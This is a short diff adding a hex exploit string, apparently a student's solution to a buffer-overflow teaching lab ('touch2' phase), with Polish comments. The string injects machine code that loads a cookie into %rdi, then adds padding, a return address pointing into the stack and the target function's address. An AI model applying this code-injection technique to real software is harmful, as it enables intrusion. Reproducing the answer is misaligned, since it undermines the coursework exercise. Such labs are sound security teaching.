@@ -1,0 +1,7 @@
+48 c7 c7 b8 dd 2e 2c c3 /* tutaj instrukcja z przypisania ciasteczka do %rdi */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* dotąd mamy padding */
+08 d4 64 55 00 00 00 00 /* adres zwrotny %rsp */
+d3 1b 40 00 00 00 00 00 /* adres funkcji touch2 */
